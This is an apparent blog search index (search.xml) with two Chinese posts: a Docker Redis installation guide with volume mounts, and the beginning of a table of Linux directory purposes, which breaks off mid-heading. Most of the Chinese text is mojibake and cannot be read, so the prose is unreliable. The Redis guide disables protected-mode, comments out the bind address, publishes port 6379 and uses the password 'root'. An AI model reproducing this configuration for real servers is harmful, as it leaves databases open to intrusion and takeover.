<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Dockerå®‰è£…Redis ï¼ˆå«æŒ‚è½½ï¼‰å®æˆ˜</title>
    <link href="/2023/02/19/Docker%E5%AE%89%E8%A3%85Redis%20%EF%BC%88%E5%90%AB%E6%8C%82%E8%BD%BD%EF%BC%89%E5%AE%9E%E6%88%98/"/>
    <url>/2023/02/19/Docker%E5%AE%89%E8%A3%85Redis%20%EF%BC%88%E5%90%AB%E6%8C%82%E8%BD%BD%EF%BC%89%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><ul><li><a href="#%E4%B8%80-docker%E6%90%9C%E7%B4%A2redis%E9%95%9C%E5%83%8F">ä¸€ã€Dockeræœç´¢redisé•œåƒ</a></li><li><a href="#%E4%BA%8C-docker%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F">äºŒã€Dockeræ‹‰å–é•œåƒ</a></li><li><a href="#%E4%B8%89-docker%E6%8C%82%E8%BD%BD%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">ä¸‰ã€DockeræŒ‚è½½é…ç½®æ–‡ä»¶</a></li><li><a href="#%E5%9B%9B-%E5%90%AF%E5%8A%A8redis-%E5%AE%B9%E5%99%A8">å››ã€å¯åŠ¨redis å®¹å™¨</a></li><li><a href="#%E4%BA%94-%E6%B5%8B%E8%AF%95">äº”ã€æµ‹è¯•</a><ul><li><a href="#1-%E9%80%9A%E8%BF%87docker-ps%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E7%8A%B6%E6%80%81">1ã€é€šè¿‡docker psæŒ‡ä»¤æŸ¥çœ‹å¯åŠ¨çŠ¶æ€</a></li><li><a href="#2-%E6%9F%A5%E7%9C%8B%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%A5%E5%BF%97">2ã€æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—</a></li><li><a href="#3-%E5%AE%B9%E5%99%A8%E5%86%85%E9%83%A8%E8%BF%9E%E6%8E%A5%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95">3ã€ <strong>å®¹å™¨å†…éƒ¨è¿æ¥è¿›è¡Œæµ‹è¯•</strong></a></li></ul></li><li><a href="#%E5%85%AD-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">å…­ã€é…ç½®æ–‡ä»¶</a></li><li><a href="#%E4%B8%83-docker%E5%88%A0%E9%99%A4redis">ä¸ƒã€Dockeråˆ é™¤Redis</a><ul><li><a href="#61-%E5%88%A0%E9%99%A4redis-%E5%AE%B9%E5%99%A8">6.1ã€åˆ é™¤Redis å®¹å™¨</a></li><li><a href="#62-%E5%88%A0%E9%99%A4redis%E9%95%9C%E5%83%8F">6.2ã€åˆ é™¤Redisé•œåƒ</a></li></ul></li></ul></li></ul></p><h1 id="dockerå®‰è£…redis-å«æŒ‚è½½å®æˆ˜"><a class="markdownIt-Anchor" href="#dockerå®‰è£…redis-å«æŒ‚è½½å®æˆ˜"></a> Dockerå®‰è£…Redis ï¼ˆå«æŒ‚è½½ï¼‰å®æˆ˜</h1><blockquote><p>ä¸ä»…æ•™ä½ å®‰è£…ï¼Œè¿˜æ•™ä½ åˆ é™¤ã€‚</p><p>æ¯ä¸€è¡Œå‘½ä»¤éƒ½å¸¦å›¾è§£ï¼Œç»å¯¹èƒ½æ‡‚ã€‚</p><p>æ­å»ºRedis Clustr (Redis é›†ç¾¤)æ„Ÿå…´è¶£çš„ï¼Œå¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« <br /><a href="https://blog.csdn.net/weixin_45821811/article/details/119421774">Dockeræ­å»ºRedis<br />Clusteré›†ç¾¤ç¯å¢ƒ</a></p></blockquote><h3 id="ä¸€-dockeræœç´¢redisé•œåƒ"><a class="markdownIt-Anchor" href="#ä¸€-dockeræœç´¢redisé•œåƒ"></a> ä¸€ã€Dockeræœç´¢redisé•œåƒ</h3><blockquote><p>å‘½ä»¤ï¼šdocker search &lt;é•œåƒåç§°&gt;</p></blockquote><pre><code class="hljs">docker search redis</code></pre><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šredisçš„é•œåƒï¼Œæ­¤å¤„å› æ²¡æœ‰æŒ‡å®šç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¸‹è½½çš„å°±æ˜¯é»˜è®¤çš„æœ€æ–°ç‰ˆæœ¬ ã€‚ <strong>redis latest.</strong></p><h3 id="äºŒ-dockeræ‹‰å–é•œåƒ"><a class="markdownIt-Anchor" href="#äºŒ-dockeræ‹‰å–é•œåƒ"></a> äºŒã€Dockeræ‹‰å–é•œåƒ</h3><blockquote><p>å‘½ä»¤ï¼šï¼šdocker pull &lt;é•œåƒåç§°&gt;:&lt;ç‰ˆæœ¬å·&gt;</p></blockquote><pre><code class="hljs">docker pull redis</code></pre><h3 id="ä¸‰-dockeræŒ‚è½½é…ç½®æ–‡ä»¶"><a class="markdownIt-Anchor" href="#ä¸‰-dockeræŒ‚è½½é…ç½®æ–‡ä»¶"></a> ä¸‰ã€DockeræŒ‚è½½é…ç½®æ–‡ä»¶</h3><p>æ¥ä¸‹æ¥å°±æ˜¯è¦å°†redis çš„é…ç½®æ–‡ä»¶è¿›è¡ŒæŒ‚è½½ï¼Œä»¥ <strong>é…ç½®æ–‡ä»¶æ–¹å¼å¯åŠ¨redis å®¹å™¨</strong>ã€‚ï¼ˆæŒ‚è½½ï¼šå³å°†å®¿ä¸»çš„æ–‡ä»¶å’Œå®¹å™¨å†…éƒ¨ç›®å½•ç›¸å…³è”ï¼Œç›¸äº’ç»‘å®šï¼Œåœ¨å®¿ä¸»æœºå†…ä¿®æ”¹æ–‡ä»¶çš„è¯ä¹Ÿéšä¹‹ä¿®æ”¹å®¹å™¨å†…éƒ¨æ–‡ä»¶ï¼‰</p><ol><li><p>æŒ‚è½½ redis çš„é…ç½®æ–‡ä»¶</p></li><li><p>æŒ‚è½½ redis çš„æŒä¹…åŒ–æ–‡ä»¶ï¼ˆä¸ºäº†æ•°æ®çš„æŒä¹…åŒ–ï¼‰ã€‚</p><p>æœ¬äººçš„é…ç½®æ–‡ä»¶æ˜¯æ”¾åœ¨</p><p><code>liunx</code> ä¸‹redis.confæ–‡ä»¶ä½ç½®ï¼š<code>/usr/local/volumes-docker/redis/conf/myredis.conf</code></p><p><code>liunx</code> ä¸‹redisçš„dataæ–‡ä»¶ä½ç½® ï¼š <code>/usr/local/volumes-docker/redis/data</code></p><p>ä½ç½®å¯ä»¥è‡ªå·±éšä¾¿é€‰æ‹©å“ˆ</p></li></ol><p><strong>mkdir -p</strong> <code>/usr/local/volumes-docker/redis/data</code> å‘½ä»¤ æ˜¯ä¸å­˜åœ¨å°±ç›´æ¥åˆ›å»º<code>/usr/local/volumes-docker/redis/data</code>æ–‡ä»¶å¤¹</p><p>æŸ¥çœ‹<code>/usr/local/volumes-docker/redis/conf/myredis.conf</code>ï¼Œä¼šå‘ç°è¯¥æ–‡ä»¶å¹¶ä¸æ˜¯myredis.confé…ç½®æ–‡ä»¶ï¼Œåªæœ‰myredis.confæ–‡ä»¶å¤¹ï¼Œè¿™æ—¶å€™éœ€è¦æˆ‘ä»¬åˆ é™¤ï¼Œmyredis.confæ–‡ä»¶å¤¹ï¼Œå»redis githubä¸‹è½½ä¸€ä¸ªæ ‡å‡†æ ¼å¼çš„myredis.confæ–‡ä»¶å¤åˆ¶åˆ°<code>/usr/local/volumes-docker/redis/conf/myredis.conf</code>ç›®å½•ä¸‹ï¼Œå¹¶æ›´æ”¹é…ç½®æ–‡ä»¶(è¿™ä¸ªæ˜¯å› ä¸ºdockeræŒ‚è½½çš„æ˜¯ç›®å½•ï¼Œå¹¶ä¸”dockerçš„rediä¹Ÿä¸è‡ªå¸¦redis.confé…ç½®æ–‡ä»¶)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec -it redis redis-server -v æŸ¥çœ‹dockerä¸­redisç‰ˆæœ¬<br><span class="hljs-attribute">1</span>.å°†redis.confé…ç½®æ–‡ä»¶ä¸­çš„protected-mode yes æ”¹ä¸ºprotected-mode no<br><span class="hljs-attribute">2</span>.å°†redis.confé…ç½®bind <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">01</span> æ”¹ä¸º # bind <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><br></code></pre></td></tr></table></figure><p>å½“protected-modeä¿æŠ¤æ¨¡å¼å…³é—­æ—¶ï¼Œå¤–éƒ¨ç½‘ç»œå¯ä»¥ç›´æ¥è®¿é—®ï¼›å½“protected-modeä¿æŠ¤æ¨¡å¼å¼€å¯æ—¶ï¼Œéœ€é…ç½®bind ipæˆ–è€…è®¾ç½®è®¿é—®å¯†ç æ‰å¯ä»¥è®¿é—®ï¼›å¦‚æœä¸æ›´æ”¹é…ç½®æ–‡ä»¶ï¼Œé¡¹ç›®ä½¿ç”¨redisçš„æ—¶å€™å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹é”™è¯¯ï¼šorg.springframework.data.redis.RedisConnectionFailureException: Unable to connect to Redisï¼›</p><p>ä¸‹è½½åœ°å€https://github.com/redis/redis/releases<br />æ‰¾åˆ°è‡ªå·±å¯¹åº”çš„ç‰ˆæœ¬ï¼Œä¸‹è½½æºä»£ç ï¼Œåœ¨æºä»£ç ä¸­æ‰¾åˆ°redis.confæ–‡ä»¶</p><p><code>myredis.conf</code> æ˜¯æˆ‘æ‰‹åŠ¨ä¸Šä¼ çš„ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219203640157.png" alt="image-20230219203640157" /></p><h3 id="å››-å¯åŠ¨redis-å®¹å™¨"><a class="markdownIt-Anchor" href="#å››-å¯åŠ¨redis-å®¹å™¨"></a> å››ã€å¯åŠ¨redis å®¹å™¨</h3><p>â€‹<br />â€‹    docker run --restart=always --log-opt max-size=100m --log-opt max-file=2 -p 6379:6379 --name redis -v /usr/local/volumes-docker/redis/conf/myredis.conf:/etc/redis/redis.conf -v /usr/local/volumes-docker/redis/data:/data -d redis:alpine3.17 redis-server /etc/redis/redis.conf  --appendonly yes  --requirepass root</p><ol><li><p><code>--restart=always</code> æ€»æ˜¯å¼€æœºå¯åŠ¨</p></li><li><p><code>--log</code>æ˜¯æ—¥å¿—æ–¹é¢çš„</p></li><li><p><code>-p 6379:6379</code> å°†6379ç«¯å£æŒ‚è½½å‡ºå»</p></li><li><p><code>--name</code> ç»™è¿™ä¸ªå®¹å™¨å–ä¸€ä¸ªåå­—</p></li><li><p><code>-v</code> æ•°æ®å·æŒ‚è½½<br /><code>/usr/local/volumes-docker/redis/conf/myredis.conf:/etc/redis/redis.conf</code> è¿™é‡Œæ˜¯å°† liunx<br />è·¯å¾„ä¸‹çš„myredis.conf å’Œredisä¸‹çš„redis.conf æŒ‚è½½åœ¨ä¸€èµ·ã€‚</p></li></ol><blockquote><p>æ³¨æ„</p><p>åƒä¸‡ä¸è¦  -v /usr/local/volumes-docker/redis/conf/myredis.conf:/etc/redis</p><p>æƒ³ç€æŠŠrediså®¹å™¨æ•´ä¸ªredisç›®å½•è¿›è¡ŒæŒ‚è½½ï¼Œä¸€ä½†è¿™æ ·åšã€‚è™½ç„¶å®¹å™¨å¯ä»¥åˆ›å»ºæˆåŠŸã€‚ä½†æ˜¯ä½¿ç”¨docker imageså‘½ä»¤å‘ç° redis å®¹å™¨çš„PORTSè¿™ä¸€æ ä¸ºç©ºã€‚å³æ˜ å°„ç«¯å£æ²¡æœ‰ã€‚</p><p>googleä¸€ä¸‹ï¼Œè²Œä¼¼å¯åŠ¨å®¹å™¨å¯ä»¥æŒ‡å®šæ˜ å°„ç«¯å£ã€‚æ²¡æœ‰è¯•è¿‡</p></blockquote><p><code>/usr/local/volumes-docker/redis/data:/data</code> è¿™ä¸ªåŒä¸Š</p><ol start="6"><li><p><code>-d redis</code> è¡¨ç¤ºåå°å¯åŠ¨redis</p></li><li><p><code>redis-server /etc/redis/redis.conf</code> ä»¥é…ç½®æ–‡ä»¶å¯åŠ¨redisï¼ŒåŠ è½½å®¹å™¨å†…çš„confæ–‡ä»¶ï¼Œæœ€ç»ˆæ‰¾åˆ°çš„æ˜¯æŒ‚è½½çš„ç›®å½• <code>/etc/redis/redis.conf</code> ä¹Ÿ å°±æ˜¯liunxä¸‹çš„**/usr/local/volumes-docker/redis/conf/myredis.conf:/etc/redis/redis.conf**</p></li><li><p><strong>â€“appendonly yes å¼€å¯redis æŒä¹…åŒ–</strong></p></li><li><p>â€“requirepass rootè®¾ç½®å¯†ç  ï¼ˆå¦‚æœä½ æ˜¯é€šè¿‡docker å®¹å™¨å†…éƒ¨è¿æ¥çš„è¯ï¼Œå°±éšæ„ï¼Œå¯è®¾å¯ä¸è®¾ã€‚ä½†æ˜¯å¦‚æœæƒ³å‘å¤–å¼€æ”¾çš„è¯ï¼Œä¸€å®šè¦è®¾ç½®ï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« â€œ<a href="https://editor.csdn.net/md/?articleId=118061056">é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸­æ¯’â€˜Kirito666â€™ç»å†</a>â€ï¼‰</p></li><li><p>æˆåŠŸç•Œé¢</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219203940034.png" alt="image-20230219203940034" /></p><h3 id="äº”-æµ‹è¯•"><a class="markdownIt-Anchor" href="#äº”-æµ‹è¯•"></a> äº”ã€æµ‹è¯•</h3><h4 id="1-é€šè¿‡docker-psæŒ‡ä»¤æŸ¥çœ‹å¯åŠ¨çŠ¶æ€"><a class="markdownIt-Anchor" href="#1-é€šè¿‡docker-psæŒ‡ä»¤æŸ¥çœ‹å¯åŠ¨çŠ¶æ€"></a> 1ã€é€šè¿‡docker psæŒ‡ä»¤æŸ¥çœ‹å¯åŠ¨çŠ¶æ€</h4><p>â€‹<br />â€‹    docker ps -a |grep redis # é€šè¿‡docker psæŒ‡ä»¤æŸ¥çœ‹å¯åŠ¨çŠ¶æ€ï¼Œæ˜¯å¦æˆåŠŸ.</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219204016896.png" alt="image-20230219204016896" /></p><h4 id="2-æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—"><a class="markdownIt-Anchor" href="#2-æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—"></a> 2ã€æŸ¥çœ‹å®¹å™¨è¿è¡Œæ—¥å¿—</h4><blockquote><p>å‘½ä»¤ï¼šdocker logs --since 30m &lt;å®¹å™¨å&gt;</p></blockquote><p>æ­¤å¤„ <code>--since 30m</code> æ˜¯æŸ¥çœ‹æ­¤å®¹å™¨10åˆ†é’Ÿä¹‹å†…çš„æ—¥å¿—æƒ…å†µã€‚</p><p>â€‹<br />â€‹    docker logs --since 10m redis</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219204132352.png" alt="image-20230219204132352" /></p><h4 id="3-å®¹å™¨å†…éƒ¨è¿æ¥è¿›è¡Œæµ‹è¯•"><a class="markdownIt-Anchor" href="#3-å®¹å™¨å†…éƒ¨è¿æ¥è¿›è¡Œæµ‹è¯•"></a> 3ã€ <strong>å®¹å™¨å†…éƒ¨è¿æ¥è¿›è¡Œæµ‹è¯•</strong></h4><p><strong>è¿›å…¥å®¹å™¨</strong></p><blockquote><p>å‘½ä»¤ï¼šdocker exec -it &lt;å®¹å™¨å&gt; /bin/bash</p></blockquote><p>æ­¤å¤„è·Ÿç€çš„ redis-cli æ˜¯ç›´æ¥å°†å‘½ä»¤è¾“åœ¨ä¸Šé¢äº†ã€‚</p><p>â€‹<br />â€‹    docker exec -it redis redis-cli</p><p>è¿›å…¥ä¹‹åï¼Œæˆ‘ç›´æ¥è¾“å…¥æŸ¥çœ‹å‘½ä»¤ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219204228201.png" alt="image-20230219204228201" /><br />erroræ˜¯æ²¡æœ‰æƒé™éªŒè¯ã€‚ <s>ï¼ˆå› ä¸ºè®¾ç½®äº†å¯†ç çš„ã€‚ï¼‰</s></p><p><strong>éªŒè¯å¯†ç ï¼š</strong></p><p>â€‹<br />â€‹    auth å¯†ç </p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219204322204.png" alt="image-20230219204322204" /></p><p><strong>æŸ¥çœ‹å½“å‰redisæœ‰æ²¡æœ‰è®¾ç½®å¯†ç ï¼š</strong> <s>ï¼ˆå¾—éªŒè¯é€šè¿‡äº†æ‰èƒ½è¾“å…¥çš„ï¼‰</s></p><p>â€‹<br />â€‹    config get requirepass</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219204345543.png" alt="image-20230219204345543" /></p><h3 id="å…­-é…ç½®æ–‡ä»¶"><a class="markdownIt-Anchor" href="#å…­-é…ç½®æ–‡ä»¶"></a> å…­ã€é…ç½®æ–‡ä»¶</h3><p><strong>myredis.conf</strong></p><p>â€‹<br />â€‹    # bind 192.168.1.100 10.0.0.1<br />â€‹    # bind 127.0.0.1 ::1<br />â€‹    #bind 127.0.0.1<br />â€‹<br />protected-mode no<br />port 6379<br />tcp-backlog 511<br />requirepass root<br />timeout 0<br />tcp-keepalive 300<br />daemonize no<br />supervised no<br />pidfile /var/run/redis_6379.pid<br />loglevel notice<br />logfile â€œâ€<br />databases 30<br />always-show-logo yes<br />save 900 1<br />save 300 10<br />save 60 10000<br />stop-writes-on-bgsave-error yes<br />rdbcompression yes<br />rdbchecksum yes<br />dbfilename dump.rdb<br />dir ./<br />replica-serve-stale-data yes<br />replica-read-only yes<br />repl-diskless-sync no<br />repl-disable-tcp-nodelay no<br />replica-priority 100<br />lazyfree-lazy-eviction no<br />lazyfree-lazy-expire no<br />lazyfree-lazy-server-del no<br />replica-lazy-flush no<br />appendonly yes<br />appendfilename â€œappendonly.aofâ€<br />no-appendfsync-on-rewrite no<br />auto-aof-rewrite-percentage 100<br />auto-aof-rewrite-min-size 64mb<br />aof-load-truncated yes<br />aof-use-rdb-preamble yes<br />lua-time-limit 5000<br />slowlog-max-len 128<br />notify-keyspace-events â€œâ€<br />hash-max-ziplist-entries 512<br />hash-max-ziplist-value 64<br />list-max-ziplist-size -2<br />list-compress-depth 0<br />set-max-intset-entries 512<br />zset-max-ziplist-entries 128<br />zset-max-ziplist-value 64<br />hll-sparse-max-bytes 3000<br />stream-node-max-bytes 4096<br />stream-node-max-entries 100<br />activerehashing yes<br />hz 10<br />dynamic-hz yes<br />aof-rewrite-incremental-fsync yes<br />rdb-save-incremental-fsync yes</p><h3 id="ä¸ƒ-dockeråˆ é™¤redis"><a class="markdownIt-Anchor" href="#ä¸ƒ-dockeråˆ é™¤redis"></a> ä¸ƒã€Dockeråˆ é™¤Redis</h3><p>æ•™äº†å¤§å®¶æ€ä¹ˆè£…ï¼Œå’±ä»¬ä¹Ÿå¾—å­¦ä¼šæ€ä¹ˆå¸è½½å“ˆï¼Œä¸ç„¶æ²¡æ³•æˆä¸ºç†Ÿç»ƒå·¥äººï¼ˆğŸ¶ï¼‰</p><h4 id="61-åˆ é™¤redis-å®¹å™¨"><a class="markdownIt-Anchor" href="#61-åˆ é™¤redis-å®¹å™¨"></a> 6.1ã€åˆ é™¤Redis å®¹å™¨</h4><ol><li><p>æŸ¥çœ‹æ‰€æœ‰åœ¨è¿è¡Œçš„å®¹å™¨ï¼š<br />å‘½ä»¤ï¼š</p><p>docker ps -a</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230219204504613.png" alt="image-20230219204504613" /></p><ol start="2"><li><p>åœæ­¢è¿è¡Œçš„Redisã€‚åœæ­¢å‘½ä»¤ï¼šdocker stop &lt;å®¹å™¨å&gt;</p><pre><code class="hljs">  docker stop redis # redis æ˜¯æˆ‘å¯åŠ¨redis å‘½åçš„åˆ«</code></pre></li><li><p>åˆ é™¤redis å®¹å™¨ï¼š åˆ é™¤å®¹å™¨å‘½ä»¤ï¼š docker rm &lt;å®¹å™¨å&gt;<br />docker rm myredis</p></li></ol><h4 id="62-åˆ é™¤redisé•œåƒ"><a class="markdownIt-Anchor" href="#62-åˆ é™¤redisé•œåƒ"></a> 6.2ã€åˆ é™¤Redisé•œåƒ</h4><p>åˆ é™¤å®¹å™¨åï¼Œæˆ‘ä»¬å¼€å§‹åˆ é™¤redisé•œåƒã€‚</p><ol><li><p>æŸ¥çœ‹å…¨éƒ¨é•œåƒ å‘½ä»¤ï¼š<code>docker images</code></p></li><li><p>åˆ é™¤é•œåƒ å‘½ä»¤ <code>docker rmi &lt;å®¹å™¨ id&gt;</code><br />docker rmi aeeb92ae6202# è¿™æ˜¯æˆ‘é•œåƒredis id</p></li></ol><p>å¯ä»¥çœ‹åˆ°Redis çš„é•œåƒå·²ç»è¢«åˆ é™¤å•¦ã€‚</p><p>å‚è€ƒæ–‡ç« </p><ol><li><p><a href="https://blog.csdn.net/weixin_45821811/article/details/116211724">å²ä¸Šæœ€è¯¦ç»†Dockerå®‰è£…Redis ï¼ˆå«æ¯ä¸€æ­¥çš„å›¾è§£ï¼‰å®æˆ˜</a></p></li><li><p><a href="https://blog.csdn.net/qq_39566521/article/details/120364224">docker å®‰è£…Rediså¹¶æŒ‚è½½é…ç½®æ–‡ä»¶</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>docker</tag>
      
      <tag>redis</tag>
      
      <tag>æŒ‚è½½</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxä¸­å„ç›®å½•(æ–‡ä»¶å¤¹)ä½œç”¨è¯¦è§£</title>
    <link href="/2023/02/19/Linux%E4%B8%AD%E5%90%84%E7%9B%AE%E5%BD%95(%E6%96%87%E4%BB%B6%E5%A4%B9)%E4%BD%9C%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/02/19/Linux%E4%B8%AD%E5%90%84%E7%9B%AE%E5%BD%95(%E6%96%87%E4%BB%B6%E5%A4%B9)%E4%BD%9C%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#%E4%B8%80-%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%90%84%E7%9B%AE%E5%BD%95%E8%AF%A6%E8%A7%A3">ä¸€ã€æ ¹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£</a></li><li><a href="#%E4%BA%8C-%E8%BF%9B%E7%A8%8B%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%90%84%E7%9B%AE%E5%BD%95%E8%AF%A6%E8%A7%A3">äºŒã€è¿›ç¨‹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£</a></li><li><a href="#%E4%B8%89-etc%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">ä¸‰ã€/etcæ–‡ä»¶ç³»ç»Ÿ</a></li><li><a href="#%E5%9B%9B-dev%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">å››ã€/devæ–‡ä»¶ç³»ç»Ÿ</a></li><li><a href="#%E4%BA%94-usr%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">äº”ã€/usræ–‡ä»¶ç³»ç»Ÿ</a></li><li><a href="#%E5%85%AD-var%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">å…­ã€/varæ–‡ä»¶ç³»ç»Ÿ</a></li><li><a href="#%E4%B8%83-proc%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">ä¸ƒã€/procæ–‡ä»¶ç³»ç»Ÿ</a></li></ul></p><h1 id="linuxä¸­å„ç›®å½•æ–‡ä»¶å¤¹ä½œç”¨è¯¦è§£"><a class="markdownIt-Anchor" href="#linuxä¸­å„ç›®å½•æ–‡ä»¶å¤¹ä½œç”¨è¯¦è§£"></a> Linuxä¸­å„ç›®å½•(æ–‡ä»¶å¤¹)ä½œç”¨è¯¦è§£</h1><h2 id="ä¸€-æ ¹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£"><a class="markdownIt-Anchor" href="#ä¸€-æ ¹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£"></a> ä¸€ã€æ ¹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£</h2><table><thead><tr><th>ç›®å½•å</th><th>è§£æ</th></tr></thead><tbody><tr><td>/bin</td><td>äºŒè¿›åˆ¶å¯æ‰§è¡Œå‘½ä»¤ã€‚è¯¥ç›®å½•ä¸‹å­˜æ”¾ç€æ™®é€šç”¨æˆ·çš„å‘½ä»¤</td></tr><tr><td>/boot</td><td>å¯åŠ¨Linuxçš„æ ¸å¿ƒæ–‡ä»¶</td></tr><tr><td>/data</td><td>ç”¨æˆ·ç”¨äºå­˜æ”¾æ—¥å¿—ç­‰æ•°æ®çš„ç›®å½•</td></tr><tr><td>/dev</td><td>ç³»ç»Ÿçš„è®¾å¤‡æ–‡ä»¶ï¼Œå³è®¾å¤‡çš„é©±åŠ¨ç¨‹åº</td></tr><tr><td>/etc</td><td>ç³»ç»Ÿæ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½åœ¨è¿™ä¸ªç›®å½•ä¸­</td></tr><tr><td>/home</td><td>ç”¨æˆ·ä¸»ç›®å½•çš„åŸºç‚¹</td></tr><tr><td>/lib</td><td>å­˜æ”¾ç€å’Œç³»ç»Ÿè¿è¡Œç›¸å…³çš„åº“æ–‡ä»¶</td></tr><tr><td>/lost-found</td><td>è¿™ä¸ªç›®å½•å¹³æ—¶æ˜¯ç©ºçš„ï¼Œå½“ç³»ç»Ÿéæ­£å¸¸å…³æœºè€Œç•™ä¸‹çš„â€œæ— å®¶å¯å½’â€çš„æ–‡ä»¶ä¾¿ä¼šå‚¨å­˜åœ¨è¿™é‡Œ</td></tr><tr><td>/media</td><td>å­˜æ”¾ç€å¯ç§»é™¤çš„è®¾å¤‡ï¼Œæ¯”å¦‚è½¯ç›˜ï¼Œå…‰ç›˜</td></tr><tr><td>/misc</td><td>å‚¨å­˜ç€ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦çš„å®šä¹‰</td></tr><tr><td>/mnt</td><td>æŒ‚è½½ç›®å½•ï¼Œæ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä¸´æ—¶å®‰è£…æ–‡ä»¶çš„ç³»ç»Ÿå®‰è£…ç‚¹</td></tr><tr><td>/net</td><td>å­˜æ”¾ç€å’Œç½‘ç»œç›¸å…³çš„ä¸€äº›æ–‡ä»¶</td></tr><tr><td>/opt</td><td>(option : è‡ªç”±é€‰æ‹©)ä¸»è¦ç»™æºç å®‰è£…è½¯ä»¶æ—¶é€‰æ‹©çš„å®‰è£…ç›®å½•ä½ç½®</td></tr><tr><td>/proc</td><td>å­˜æ”¾ç€ç”¨æˆ·ä¸å†…æ ¸çš„äº¤äº’ä¿¡æ¯</td></tr><tr><td>/root</td><td>è¶…çº§ç”¨æˆ·çš„ç›®å½•</td></tr><tr><td>/sbin</td><td>ç³»ç»Ÿçš„ç®¡ç†å‘½ä»¤ï¼Œè¿™é‡Œå­˜æ”¾çš„æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„ç¨‹åº</td></tr><tr><td>/selinux</td><td>ä¸»è¦ç”¨æ¥åŠ å›ºæ“ä½œç³»ç»Ÿï¼Œæé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§</td></tr><tr><td>/srv</td><td>ç³»ç»Ÿå¯åŠ¨æœåŠ¡æ—¶å¯ä»¥è®¿é—®çš„æ•°æ®åº“ç›®å½•</td></tr><tr><td>/sys</td><td>ç®¡ç†è®¾å¤‡æ–‡ä»¶</td></tr><tr><td>/tmp</td><td>ä¸´æ—¶æ–‡ä»¶ï¼Œé‡å¯åè‡ªåŠ¨æ¸…ç©º</td></tr><tr><td>/var</td><td>æŸäº›å¤§æ–‡ä»¶çš„æº¢å‡ºåŒºï¼Œæ¯”å¦‚å„ç§æœåŠ¡çš„æ—¥å¿—æ–‡ä»¶</td></tr><tr><td>/usr</td><td>æœ€å¤§çš„ç›®å½•ï¼Œå­˜æ”¾ç€åº”ç”¨ç¨‹åºå’Œæ–‡ä»¶</td></tr></tbody></table><p>æ ¹ç›®å½•ä¸‹å„ç›®å½•ä½œç”¨çš„ç®€å•äº†è§£ï¼Œèƒ½æ–¹ä¾¿æˆ‘ä»¬å¯¹Linuxç³»ç»Ÿçš„ç†è§£å’Œè¿ç”¨ï¼Œåé¢ä¼šéšç€å­¦ä¹ æ·±å…¥ï¼Œä¼šç»§ç»­æ·»åŠ å…¶ä»–ä¸€äº›ç›®å½•çš„ä½œç”¨è§£æã€‚</p><h2 id="äºŒ-è¿›ç¨‹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£"><a class="markdownIt-Anchor" href="#äºŒ-è¿›ç¨‹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£"></a> 